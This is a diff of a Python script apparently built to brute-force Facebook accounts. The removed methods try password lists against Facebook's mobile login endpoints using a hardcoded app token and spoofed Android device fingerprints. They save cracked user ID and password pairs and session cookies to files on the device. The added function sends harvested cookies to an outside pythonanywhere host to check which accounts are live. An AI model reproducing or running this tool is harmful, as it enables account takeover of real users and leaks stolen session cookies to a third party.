-                        ua = "Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.0; '+model+' Build/'+''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))+' [FBAN/FB4A;FBAV/'+str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))+';FBBV/'+str(random.randint(745000000,745999999))+';FBDM/{density=2.25,width=720,height=1452};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.adsmanager;FBDV/'+model+';FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
-                               
-                        random_seed = random.Random()
-                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
-                        device_id = str(uuid.uuid4())
-                        secure = str(uuid.uuid4())
-                        family = str(uuid.uuid4())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
-                        sim_serials = f'["{xd}"]'
-                        li = ['28','29','210']
-                        li2 = random.choice(li)
-                        j1 = ''.join(random.choice(digits) for _ in range(2))
-                        jazoest = li2+j1
-                        data = {
-                                'adid':adid,
-                                'format':'json',
-                                'device_id':device_id,
-                                'email':ids,
-                                'password':pas,
-                                'generate_analytics_claims':'1',
-                                'credentials_type':'password',
-                                'source':'login',
-                                'error_detail_type':'button_with_disabled',
-                                'enroll_misauth':'false',
-                                'generate_session_cookies':'1',
-                                'generate_machine_id':'1',
-                                'fb_api_req_friendly_name':'authenticate',
-                        }
-                        headers={
-                                'Authorization':f'OAuth {accessToken}',
-                                'X-FB-Friendly-Name':'authenticate',
-                                'X-FB-Connection-Type':'unknown',
-                                'User-Agent':ua,
-                                'Accept-Encoding':'gzip, deflate',
-                                'Content-Type': 'application/x-www-form-urlencoded',
-                                'X-FB-HTTP-Engine': 'Liger'
-                                }
-                        url = 'https://b-graph.facebook.com/auth/login'
-                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-                        po = requests.post(url,data=data,headers=headers).json()
-                        if 'session_key' in po:
-                                try:
-                                        uid = po['uid']
-                                except:
-                                        uid = ids
-                                if str(uid) in oks:
-                                        break
-                                else:
-                                        print('\r\r\033[1;32m [SK-OK] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        #print("\r\r\033[1;33m Cookie: "+coki)
-                                        #open('/sdcard/SK-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/SK-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
-                                        oks.append(str(uid))
-                                        break
-                        elif 'www.facebook.com' in po['error']['message']:
-                                try:
-                                        uid = po['error']['error_data']['uid']
-                                except:
-                                        uid = ids
-                                if uid in oks:pass
-                                else:
-                                        print('\r\r\x1b[38;5;205m [SK-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/SK-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
-                                        cps.append(str(ids))
-                                        break
-                        else:continue
-                loop+=1
-        except Exception as e:
-                pass
-#method4
-def trt4(ids,passlist):
-        global loop
-        global oks
-        sys.stdout.write('\r\r\033[1;37m [TRT-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-        try:
-                for pas in passlist:
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
-                        fbbv = str(random.randint(111111111,999999999))
-                        android_version = device['android_version']
-                        model = device['model']
-                        build = device['build']
-                        fblc = device['fblc']
-                        fbcr = sim_id
-                        fbmf = device['fbmf']
-                        fbbd = device['fbbd']
-                        fbdv = device['fbdv']
-                        fbsv = device['fbsv']
-                        fbca = device['fbca']
-                        fbdm = device['fbdm']
-                        fbfw = '1'
-                        fbrv = '0'
-                        fban = 'FB4A'
-                        fbpn = 'com.facebook.katana'
-                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1440,height=3130};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
-                        random_seed = random.Random()
-                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
-                        device_id = str(uuid.uuid4())
-                        secure = str(uuid.uuid4())
-                        family = str(uuid.uuid4())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
-                        sim_serials = f'["{xd}"]'
-                        li = ['28','29','210']
-                        li2 = random.choice(li)
-                        j1 = ''.join(random.choice(digits) for _ in range(2))
-                        jazoest = li2+j1
-                        data = {
-                                'adid':adid,
-                                'format':'json',
-                                'device_id':device_id,
-                                'email':ids,
-                                'password':pas,
-                                'generate_analytics_claims':'1',
-                                'credentials_type':'password',
-                                'source':'login',
-                                'error_detail_type':'button_with_disabled',
-                                'enroll_misauth':'false',
-                                'generate_session_cookies':'1',
-                                'generate_machine_id':'1',
-                                'fb_api_req_friendly_name':'authenticate',
-                        }
-                        headers={
-                                'Authorization':f'OAuth {accessToken}',
-                                'X-FB-Friendly-Name':'authenticate',
-                                'X-FB-Connection-Type':'unknown',
-                                'User-Agent':ua,
-                                'Accept-Encoding':'gzip, deflate',
-                                'Content-Type': 'application/x-www-form-urlencoded',
-                                'X-FB-HTTP-Engine': 'Liger'
-                                }
-                        url = 'https://b-graph.facebook.com/auth/login'
-                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-                        po = requests.post(url,data=data,headers=headers).json()
-                        if 'session_key' in po:
-                                try:
-                                        uid = po['uid']
-                                except:
-                                        uid = ids
-                                if str(uid) in oks:
-                                        break
-                                else:
-                                        print('\r\r\033[1;32m [TRT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        print("Cookie: "+coki)
-                                        open('/sdcard/TRT-COOKIE.txt','a').write(coki+'\n')
-                                        open('/sdcard/TRT-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
-                                        oks.append(str(uid))
-                                        break
-                        elif 'www.facebook.com' in po['error']['message']:
-                                try:
-                                        uid = po['error']['error_data']['uid']
-                                except:
-                                        uid = ids
-                                if uid in oks:pass
-                                else:
-                                        print('\r\r\x1b[38;5;205m [TRT-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/TRT-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
-                                        cps.append(str(ids))
-                                        break
-                        else:continue
-                loop+=1
-        except Exception as e:
-                pass
-#method5
-def trt5(ids,passlist):
-        global loop
-        global oks
-        sys.stdout.write('\r\r\033[1;37m [TRT-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-        try:
-                for pas in passlist:
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
-                        fbbv = str(random.randint(111111111,999999999))
-                        android_version = device['android_version']
-                        model = device['model']
-                        build = device['build']
-                        fblc = device['fblc']
-                        fbcr = sim_id
-                        fbmf = device['fbmf']
-                        fbbd = device['fbbd']
-                        fbdv = device['fbdv']
-                        fbsv = device['fbsv']
-                        fbca = device['fbca']
-                        fbdm = device['fbdm']
-                        fbfw = '1'
-                        fbrv = '0'
-                        fban = 'FB4A'
-                        fbpn = 'com.facebook.katana'
-                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=2246};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
-                        random_seed = random.Random()
-                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
-                        device_id = str(uuid.uuid4())
-                        secure = str(uuid.uuid4())
-                        family = str(uuid.uuid4())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
-                        sim_serials = f'["{xd}"]'
-                        li = ['28','29','210']
-                        li2 = random.choice(li)
-                        j1 = ''.join(random.choice(digits) for _ in range(2))
-                        jazoest = li2+j1
-                        data = {
-                                'adid':adid,
-                                'format':'json',
-                                'device_id':device_id,
-                                'email':ids,
-                                'password':pas,
-                                'generate_analytics_claims':'1',
-                                'credentials_type':'password',
-                                'source':'login',
-                                'error_detail_type':'button_with_disabled',
-                                'enroll_misauth':'false',
-                                'generate_session_cookies':'1',
-                                'generate_machine_id':'1',
-                                'fb_api_req_friendly_name':'authenticate',
-                        }
-                        headers={
-                                'Authorization':f'OAuth {accessToken}',
-                                'X-FB-Friendly-Name':'authenticate',
-                                'X-FB-Connection-Type':'unknown',
-                                'User-Agent':ua,
-                                'Accept-Encoding':'gzip, deflate',
-                                'Content-Type': 'application/x-www-form-urlencoded',
-                                'X-FB-HTTP-Engine': 'Liger'
-                                }
-                        url = 'https://b-graph.facebook.com/auth/login'
-                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-                        po = requests.post(url,data=data,headers=headers).json()
-                        if 'session_key' in po:
-                                try:
-                                        uid = po['uid']
-                                except:
-                                        uid = ids
-                                if str(uid) in oks:
-                                        break
-                                else:
-                                        print('\r\r\033[1;32m [TRT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/TRT-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
-                                        oks.append(str(uid))
-                                        break
-                        elif 'www.facebook.com' in po['error']['message']:
-                                try:
-                                        uid = po['error']['error_data']['uid']
-                                except:
-                                        uid = ids
-                                if uid in oks:pass
-                                else:
-                                        print('\r\r\x1b[38;5;205m [TRT-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/TRT-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
-                                        cps.append(str(ids))
-                                        break
-                        else:continue
-                loop+=1
-        except Exception as e:
-                pass
-#method6
-def trt6(ids,passlist):
-	global loop
-	global oks
-	try:
-		for pas in passlist:
-			sys.stdout.write('\r\r\033[1;37m [TRT-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-			session = requests.Session()
-			ua = random.choice(ugen)
-			free_fb = session.get('https://free.facebook.com').text
-			log_data = {
-				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-			"try_number":"0",
-			"unrecognized_tries":"0",
-			"email":uid,
-			"pass":ps,
-			"login":"Log In"}
-			header_freefb = {'authority':'p.facebook.com',
-			'upgrade-insecure-requests': '1',
-			'viewport-width': '980',
-			'method': 'path',
-			'scheme': 'https',
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-			'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 
-			'dnt':'1', 
-			'x-requested-with':'mark.via.gp', 
-			'sec-fetch-site': 'none',
-			'sec-fetch-mode': 'navigate',
-			'sec-fetch-user': '?1',
-			'sec-fetch-dest': 'document',
-			'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
-			'cache-control': 'max-age=0',
-			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
-			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
-			"sec-ch-prefers-color-scheme": "light",
-			'user-agent': ua}
-			lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
-			log_cookies=session.cookies.get_dict().keys()
-			if 'c_user' in log_cookies:
-				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				uid = coki[151:166]
-				if uid in oks:pass
-				else:
-					if 'checkpoint' in str(lo):
-						print('\r\r\033[1;34m [TRT-2F] '+uid+' | '+pas)
-					else:
-						print(f'\r\x1b[1;32m [TRT-OK] '+uid+' | '+pas)
-						open('/sdcard/TRT-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
-						oks.append(uid)
-						break
-			elif 'checkpoint' in log_cookies:
-				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				uid=coki[141:156]
-				if uid in cps:pass
-				else:
-					print('\r\r\x1b[38;5;205m [TRT-CP] '+uid+' | '+pas+'\033[1;97m')
-					open('/sdcard/TRT-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
-					cps.append(ids)
-					break
-			else:
-				continue
-		loop+=1
-	except requests.exceptions.ConnectionError:
-		time.sleep(10)
-	except:
-		pass
-try:
-	menu()
-except requests.exceptions.ConnectionError:
-	print('\n No internet connection ...')
-	exit()
-except:exit()
+        except:pass
+def lock_ramove(coki,uid,ps):
+    url=f'https://mahdix.pythonanywhere.com/fbapi?cooki={coki}'
+    ckapi=requests.get(url).json()
+    lock=ckapi["Live"]
+    if 'True' in lock:
+        print(f'\r\r \033[1;31m[{G}BLACK\033[1;31m-\033[1;32mOK\033[1;31m]{G} '+str(uid)+' \033[1;31m|\033[1;32m '+ps+'\033[1;37m')
+        open('/sdcard/BLACK-RNDM-OK.txt','a').write(str(uid)+'|'+ps+'|'+coki+'\n')
+        ok.append(uid)
+main()
